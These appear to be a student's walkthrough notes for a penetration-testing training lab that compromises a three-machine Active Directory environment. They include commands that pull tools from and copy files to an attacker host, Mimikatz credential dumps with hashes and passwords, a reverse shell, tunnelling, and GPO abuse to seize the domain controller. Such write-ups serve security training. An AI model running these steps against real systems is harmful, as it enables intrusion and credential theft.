# Preamble
**Challenge Lab 0: SECURA**: In the first Challenge Lab, you are tasked with performing a penetration test on SECURA's three-machine enterprise environment. This lab serves as a ramp-up before tackling the more complex Challenge Labs 1-3. You will exploit vulnerabilities in ManageEngine, pivot through internal services, and leverage insecure GPO permissions to escalate privileges and compromise the domain.

We have been tasked to conduct a penetration test on the network of _Secura_. Several vulnerabilities and misconfigurations are present on the Active Directory environment, which can be leveraged by an attacker to gain access to all workstations. The main objective is obtain access to the Domain Controller.

The public subnet of the network resides in the `192.168.xx.0/24` range, where the `xx` of the third octet can be found under the _IP ADDRESS_ field in the control panel.
# Initial Scan
- Nmap Scan [`nmap -p- -A -oN nmap_{95-97}.txt 192.168.197.{95-97}`]
	- 192.168.197.95 (shortened)
		```
		Nmap scan report for 192.168.197.95
		Host is up (0.0094s latency).
		Not shown: 993 closed tcp ports (reset)
		PORT      STATE SERVICE
		135/tcp   open  msrpc
		139/tcp   open  netbios-ssn
		445/tcp   open  microsoft-ds
		5001/tcp  open  commplex-link
		5985/tcp  open  wsman
		8443/tcp  open  https-alt
		12000/tcp open  cce4x
		```
	- 192.168.197.96  (shortened)
		```
		Nmap scan report for 192.168.197.96
		Host is up (0.0086s latency).
		Not shown: 995 closed tcp ports (reset)
		PORT     STATE SERVICE
		135/tcp  open  msrpc
		139/tcp  open  netbios-ssn
		445/tcp  open  microsoft-ds
		3306/tcp open  mysql
		5985/tcp open  wsman
		```
	- 192.168.197.97  (shortened)
		```
		Nmap scan report for 192.168.197.97
		Host is up (0.0059s latency).
		Not shown: 988 filtered tcp ports (no-response)
		PORT     STATE SERVICE
		53/tcp   open  domain
		88/tcp   open  kerberos-sec
		135/tcp  open  msrpc
		139/tcp  open  netbios-ssn
		389/tcp  open  ldap
		445/tcp  open  microsoft-ds
		464/tcp  open  kpasswd5
		593/tcp  open  http-rpc-epmap
		636/tcp  open  ldapssl
		3268/tcp open  globalcatLDAP
		3269/tcp open  globalcatLDAPssl
		5985/tcp open  wsman
		```
# 192.168.197.95 (SECURE)
## Enumeration
- Web Server hosting ManageEngine Applications Manager
- Login with admin:admin
- ManageEngine Applications Manager Version 14 Build Number 14710
	- Vulnerable to RCE Exploit: https://www.exploit-db.com/exploits/48793 
		![[Pasted image 20250208110454.png]]
## Initial Access & Flag
- Exploit and obtain reverse shell as NT AUTHORITY\SYSTEM
	- C:\Users\Administrator\Desktop\proof.txt 
		![[Pasted image 20250208110618.png]]
## AD Enumeration
- Transfer SharpHound.ps1 and run
	- `PS C:\Windows\Temp> iwr -Uri http://192.168.45.221/SharpHound.ps1 -UseBasicParsing -Outfile SharpHound.ps1`
	- Transfer BloodHound zip file to Kali:
		```shell
		kali@kali:~$ impacket-smbserver -smb2support test .
		C:\Users\offsec> copy FILE \\KALI_IP\test # from Win to Kali
		```
- Computers / Hosts
	![[Pasted image 20250208112306.png]]
	![[Pasted image 20250208113042.png]]
	- SECURE.SECURA.YZX (192.168.197.95)
	- ERA.SECURA.YZX (192.168.197.96)
	- DC01.SECURA.YZX (192.168.197.97)
- Users
	![[Pasted image 20250208112402.png]]
	- michael
	- charlotte (Remote Management User)
- Mimikatz
	- SEKURLSA::LOGONPASSWORDS
		```json
		Authentication Id : 0 ; 299186 (00000000:000490b2)
		Session           : Interactive from 1
		User Name         : Administrator
		Domain            : SECURE
		Logon Server      : SECURE
		Logon Time        : 1/29/2025 5:51:29 PM
		SID               : S-1-5-21-3197578891-1085383791-1901100223-500
				msv :
				 [00000003] Primary
				 * Username : Administrator
				 * Domain   : SECURE
				 * NTLM     : a51493b0b06e5e35f855245e71af1d14
				 * SHA1     : 02fb73dd0516da435ac4681bda9cbed3c128e1aa
				tspkg :
				wdigest :
				 * Username : Administrator
				 * Domain   : SECURE
				 * Password : (null)
				kerberos :
				 * Username : Administrator
				 * Domain   : SECURE
				 * Password : (null)
				ssp :
				credman :
				 [00000000]
				 * Username : apache
				 * Domain   : era.secura.local
				 * Password : New2Era4.!
				cloudap :
		```
- Found credentials for ERA (192.168.197.96)
# 192.168.197.96 (ERA)
## Initial Access
- Evil-WinRM into machine with found apache credentials
![[Pasted image 20250208114631.png]]
## Enumeration
- Upload and run winPEASx64.exe
	- ???
- Found passwords:
	![[Pasted image 20250208120246.png]]
	- mysql user: root (no password!)
- Cannot access mysql locally via CLI, need to tunnel to the machine to access
## Tunneling via Ligolo-Ng
- Use Ligolo-Ng
	- Setup Proxy on Kali Machine
	```shell
	# Prep Ligolo's tunnel interface
	kali@kali:~$ sudo ip tuntap add user kali mode tun ligolo
	kali@kali:~$ sudo ip link set ligolo up

	# Start Ligolo proxy on Kali
	kali@kali:~$ ./linux_amd64-proxy -selfcert -laddr 0.0.0.0:443

	# Transfer Ligolo Agent and run on victim
	C:\xampp> .\win64-agent.exe -connect 192.168.45.221:443 -ignore-cert

	# Add the route to ligolo
	kali@kali:~$ sudo ip route add 192.168.197.96/32 dev ligolo # OR
	kali@kali:~$ sudo ip route add 240.0.0.1/32 dev ligolo

	# Connection Established, Start tunnel
	ligolo-ng>> session # Select the session with victim
	ligolo-ng>> start # Start tunnel
	```
- Now with the tunnel set up, access MariaDB:
	- `mysql -u root -h 240.0.0.1 -P 3306 --skip-ssl`
	- Enumerate the DB (creds DB -> creds TABLE)
		- administrator:Almost4There8.?
		- charlotte:Game2On4.!
## Flags
- Using the administrator credentials, Evil-WinRM into the machine again
	- Get proof.txt in Administrator desktop
	![[Pasted image 20250208130603.png]]
	- Get local.txt in apache desktop
	![[Pasted image 20250208130647.png]]

# 192.168.197.97 (DC01)
## Initial Access & Flag
- Evil-WinRM into machine with charlotte credentials
	- Get local.txt on Charlotte's Desktop
	![[Pasted image 20250208130141.png]]
## Privilege Escalation
- Use SharpGPOAbuse.exe to escalate
	![[Pasted image 20250208132155.png]]
	- Find GPO to abuse:
		![[Pasted image 20250208145412.png]]
	- Charlotte has permisssions on this policy (SharpHound or other cmd)
	- `.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount charlotte --GPOName "Default Domain Policy"`
	- Force the change with `gpupdate /force`
	- Re-enter with impacket-psexec:
		`impacket-psexec SECURA/charlotte@192.168.197.97`
## Flag
- Get proof.txt from Administrator.DC01 desktop
![[Pasted image 20250208150505.png]]
# Further Reference
1. Ligolo-Ng Tutorial: https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740
2. SharpGPOAbuse.exe Tutorial: https://medium.com/@mahdi_78420/vault-walkthrough-practice-41f28ebfe045